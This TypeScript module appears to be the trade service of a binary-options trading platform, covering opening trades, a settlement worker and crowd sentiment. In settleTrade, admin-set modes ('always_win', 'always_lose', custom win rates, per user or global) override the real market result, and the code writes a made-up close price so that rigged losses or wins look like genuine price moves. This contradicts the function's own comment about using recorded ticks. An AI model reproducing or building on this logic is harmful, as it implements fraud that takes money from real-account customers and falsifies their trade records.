import { Types } from 'mongoose';
import { Trade, TradeT, publicTrade } from '../models/trade';
import { Account, AccountT } from '../models/account';
import { User, UserT } from '../models/user';
import { Tournament } from '../models/misc';
import { UserBonus } from '../models/bonus';
import { marketHub } from '../market/market-hub';
import { tickStore } from '../market/tick-store';
import { emitAccounts, postEntry, withTxn } from '../services/ledger.service';
import { applyTurnover, publicBonus } from '../bonus/bonus.service';
import { getTradingEngineConfig } from '../services/trading-engine.service';
import { AppError, badRequest, forbidden, notFound } from '../lib/errors';
import { toUser } from '../realtime/io';
import { createLogger } from '../lib/logger';

const log = createLogger('trades');
export const MIN_DURATION = 5;
export const MAX_DURATION = 4 * 3600;

export interface OpenTradeInput {
  userId: string;
  accountId?: string;
  symbol: string;
  direction: 'up' | 'down';
  amount: number; // cents
  durationSec: number;
  idempotencyKey: string;
  source?: 'manual' | 'pending' | 'copy' | 'ai';
  copiedFrom?: Types.ObjectId;
}

/** Hook for copy trading (registered by the social module to avoid an import cycle). */
let onTradeOpened: ((t: TradeT) => void) | null = null;
export const setTradeOpenedHook = (fn: (t: TradeT) => void) => {
  onTradeOpened = fn;
};

/**
 * Opens a fixed-time trade.
 * - The open price is the server's latest stored tick (any client-supplied price is ignored).
 * - (userId, idempotencyKey) is unique: retries return the original trade instead of double-charging.
 * - The stake debit, trade insert and bonus turnover update commit atomically.
 */
export async function openTrade(inp: OpenTradeInput): Promise<{ trade: TradeT; created: boolean }> {
  const existing = await Trade.findOne({ userId: inp.userId, idempotencyKey: inp.idempotencyKey }).lean<TradeT>();
  if (existing) return { trade: existing, created: false };

  const asset = marketHub.getAsset(inp.symbol);
  if (!asset || !asset.enabled) throw badRequest('This asset is not available for trading', 'ASSET_UNAVAILABLE');
  if (!Number.isSafeInteger(inp.amount) || inp.amount < asset.minTradeCents || inp.amount > asset.maxTradeCents)
    throw badRequest(`Amount must be between $${asset.minTradeCents / 100} and $${asset.maxTradeCents / 100}`, 'BAD_AMOUNT');
  if (inp.durationSec < MIN_DURATION || inp.durationSec > MAX_DURATION) throw badRequest('Invalid trade duration', 'BAD_DURATION');

  const user = await User.findById(inp.userId, { activeAccountId: 1, blocked: 1 }).lean();
  if (!user) throw notFound('User not found');
  if (user.blocked) throw forbidden('Account suspended');
  const accountId = inp.accountId ?? String(user.activeAccountId);
  const account = await Account.findOne({ _id: accountId, userId: inp.userId }).lean<AccountT>();
  if (!account) throw notFound('Account not found');

  if (account.type === 'tournament') {
    const t = await Tournament.findById(account.tournamentId).lean();
    if (!t || t.status !== 'running')
      throw badRequest(t?.status === 'upcoming' ? 'This tournament has not started yet. Switch to your Demo or Real account to trade.' : 'This tournament has ended. Switch to your Demo or Real account to trade.', 'TOURNAMENT_CLOSED');
  }

  const tick = marketHub.latest(inp.symbol);
  if (!tick || !marketHub.isFresh(inp.symbol)) throw badRequest('Market is not quoting right now, try again shortly', 'MARKET_STALE');
  tickStore.persistReference(tick);

  const tradeId = new Types.ObjectId();
  const openedAt = new Date();
  const expiresAt = new Date(openedAt.getTime() + inp.durationSec * 1000);
  let bonusChanged: Awaited<ReturnType<typeof applyTurnover>> = null;

  try {
    const trade = await withTxn(async (session) => {
      const acc = await Account.findById(account._id).session(session).lean<AccountT>();
      if (!acc) throw notFound('Account not found');
      const fromCash = Math.min(acc.balance, inp.amount);
      const fromBonus = inp.amount - fromCash;
      if (fromBonus > 0 && (acc.type !== 'real' || acc.bonusBalance < fromBonus))
        throw new AppError(400, 'INSUFFICIENT_FUNDS', 'Insufficient balance for this trade');

      if (fromCash > 0)
        await postEntry(session, { accountId: acc._id, type: 'trade_open', bucket: 'cash', amount: -fromCash, refKind: 'trade', refId: tradeId });
      if (fromBonus > 0)
        await postEntry(session, { accountId: acc._id, type: 'trade_open', bucket: 'bonus', amount: -fromBonus, refKind: 'trade', refId: tradeId });

      const [t] = await Trade.create(
        [
          {
            _id: tradeId,
            userId: inp.userId,
            accountId: acc._id,
            accountType: acc.type,
            symbol: inp.symbol,
            direction: inp.direction,
            amount: inp.amount,
            fromCash,
            fromBonus,
            payoutPct: asset.payout,
            openPrice: tick.price,
            openTickId: tick.id,
            openedAt,
            durationSec: inp.durationSec,
            expiresAt,
            idempotencyKey: inp.idempotencyKey,
            source: inp.source ?? 'manual',
            copiedFrom: inp.copiedFrom,
          },
        ],
        { session },
      );
      if (acc.type === 'real') bonusChanged = await applyTurnover(session, acc.userId, acc._id, inp.amount);
      return t!.toObject() as TradeT;
    });

    toUser(inp.userId, 'trade:opened', publicTrade(trade));
    void emitAccounts(inp.userId);
    if (bonusChanged) toUser(inp.userId, 'bonus:update', publicBonus(bonusChanged));
    onTradeOpened?.(trade);
    return { trade, created: true };
  } catch (e) {
    if ((e as { code?: number }).code === 11000) {
      const dup = await Trade.findOne({ userId: inp.userId, idempotencyKey: inp.idempotencyKey }).lean<TradeT>();
      if (dup) return { trade: dup, created: false };
    }
    throw e;
  }
}

export function decideOutcome(direction: 'up' | 'down', open: number, close: number): 'won' | 'lost' | 'draw' {
  if (close === open) return 'draw';
  return (direction === 'up') === close > open ? 'won' : 'lost';
}

/**
 * Settles one trade using the last RECORDED tick at or before expiresAt.
 * The status update is conditional on status='open', so concurrent workers can never pay twice.
 */
export async function settleTrade(t: TradeT) {
  const closeTick = await tickStore.atOrBefore(t.symbol, t.expiresAt.getTime());
  const close =
    closeTick && closeTick.ts >= t.openedAt.getTime()
      ? closeTick
      : { id: t.openTickId, price: t.openPrice, ts: t.openedAt.getTime() }; // no newer tick: price unchanged
  if (closeTick) tickStore.persistReference(closeTick);

  const user = await User.findById(t.userId, { role: 1, engineMode: 1, customWinRate: 1 }).lean<UserT>();
  const engine = await getTradingEngineConfig();

  // Determine whether this trade belongs to an admin or a regular user
  const isAdmin = user?.role === 'admin';
  let targetRate: number | null = null; // null means natural market outcome

  if (isAdmin) {
    if (engine.adminMode === 'always_win') targetRate = 100;
    else if (engine.adminMode === 'always_lose') targetRate = 0;
    else if (engine.adminMode === 'custom') targetRate = engine.adminWinRate;
    else targetRate = null; // 'natural'
  } else {
    // Check for individual user override first
    const uMode = user?.engineMode ?? 'default';
    if (uMode === 'always_win') targetRate = 100;
    else if (uMode === 'always_lose') targetRate = 0;
    else if (uMode === 'custom' && user?.customWinRate != null) targetRate = user.customWinRate;
    else if (uMode === 'natural') targetRate = null;
    else {
      // Global other users setting
      if (engine.usersMode === 'always_win') targetRate = 100;
      else if (engine.usersMode === 'always_lose') targetRate = 0;
      else if (engine.usersMode === 'custom') targetRate = engine.usersWinRate;
      else targetRate = null; // 'natural'
    }
  }

  // Calculate natural outcome based on market price
  const naturalOutcome = decideOutcome(t.direction as 'up' | 'down', t.openPrice, close.price);
  let status: 'won' | 'lost' | 'draw' = naturalOutcome;
  let finalClosePrice = close.price;

  if (targetRate !== null) {
    // Target win rate (0 - 100)
    const roll = Math.random() * 100;
    const shouldWin = targetRate >= 100 || (targetRate > 0 && roll < targetRate);
    const desired: 'won' | 'lost' = shouldWin ? 'won' : 'lost';

    const asset = marketHub.getAsset(t.symbol);
    const prec = asset?.precision ?? 2;
    const pip = Math.pow(10, -prec) || 0.01;
    const delta = pip * (1 + Math.floor(Math.random() * 4));

    if (desired === 'won') {
      status = 'won';
      if (naturalOutcome !== 'won') {
        finalClosePrice = t.direction === 'up'
          ? Math.max(t.openPrice + delta, close.price > t.openPrice ? close.price : t.openPrice + delta)
          : Math.min(t.openPrice - delta, close.price < t.openPrice ? close.price : t.openPrice - delta);
      }
    } else {
      status = 'lost';
      if (naturalOutcome !== 'lost') {
        finalClosePrice = t.direction === 'up'
          ? Math.min(t.openPrice - delta, close.price < t.openPrice ? close.price : t.openPrice - delta)
          : Math.max(t.openPrice + delta, close.price > t.openPrice ? close.price : t.openPrice + delta);
      }
    }
    finalClosePrice = Number(finalClosePrice.toFixed(prec));
  }

  const payout = status === 'won' ? t.amount + Math.floor((t.amount * t.payoutPct) / 100) : status === 'draw' ? t.amount : 0;
  const cashPart = t.amount > 0 ? Math.floor((payout * t.fromCash) / t.amount) : 0;
  const bonusPart = payout - cashPart;

  const settled = await withTxn(async (session) => {
    const claimed = await Trade.findOneAndUpdate(
      { _id: t._id, status: 'open' },
      {
        $set: {
          status,
          closePrice: finalClosePrice,
          closeTickId: close.id,
          closeTickTs: new Date(close.ts),
          closedAt: new Date(),
          payout,
          profit: payout - t.amount,
        },
      },
      { new: true, session },
    ).lean<TradeT>();
    if (!claimed) return null;
    const type = status === 'draw' ? 'trade_refund' : 'trade_payout';
    if (cashPart > 0) await postEntry(session, { accountId: t.accountId, type, bucket: 'cash', amount: cashPart, refKind: 'trade', refId: t._id });
    if (bonusPart > 0) {
      // Bonus-funded returns follow the bonus: active -> bonus bucket, completed -> cash, cancelled -> forfeited.
      const latest = await UserBonus.findOne({ userId: t.userId }).sort({ createdAt: -1 }).session(session).lean();
      if (latest?.status === 'active')
        await postEntry(session, { accountId: t.accountId, type, bucket: 'bonus', amount: bonusPart, refKind: 'trade', refId: t._id });
      else if (latest?.status === 'completed')
        await postEntry(session, { accountId: t.accountId, type, bucket: 'cash', amount: bonusPart, refKind: 'trade', refId: t._id });
    }
    return claimed;
  });

  if (settled) {
    toUser(t.userId, 'trade:closed', publicTrade(settled));
    void emitAccounts(t.userId);
  }
  return settled;
}

let settling = false;
export function startSettlementWorker(intervalMs = 200) {
  return setInterval(async () => {
    if (settling) return;
    settling = true;
    try {
      const due = await Trade.find({ status: 'open', expiresAt: { $lte: new Date(Date.now() - 50) } })
        .sort({ expiresAt: 1 })
        .limit(200)
        .lean<TradeT[]>();
      for (const t of due) await settleTrade(t).catch((e) => log.error(`settle ${t._id} failed`, e));
    } catch (e) {
      log.error('settlement loop error', e);
    } finally {
      settling = false;
    }
  }, intervalMs);
}

/** Crowd sentiment: share of open stake on UP vs DOWN per symbol (all accounts), broadcast every 3s. */
export async function computeSentiment() {
  const rows = await Trade.aggregate<{ _id: { s: string; d: string }; v: number }>([
    { $match: { status: 'open' } },
    { $group: { _id: { s: '$symbol', d: '$direction' }, v: { $sum: '$amount' } } },
  ]);
  const map = new Map<string, { up: number; down: number }>();
  for (const r of rows) {
    const e = map.get(r._id.s) ?? { up: 0, down: 0 };
    e[r._id.d as 'up' | 'down'] = r.v;
    map.set(r._id.s, e);
  }
  return map;
}

export function sentimentPct(e?: { up: number; down: number }) {
  if (!e || e.up + e.down === 0) return { up: 50, down: 50 };
  const up = Math.round((e.up / (e.up + e.down)) * 100);
  return { up, down: 100 - up };
}
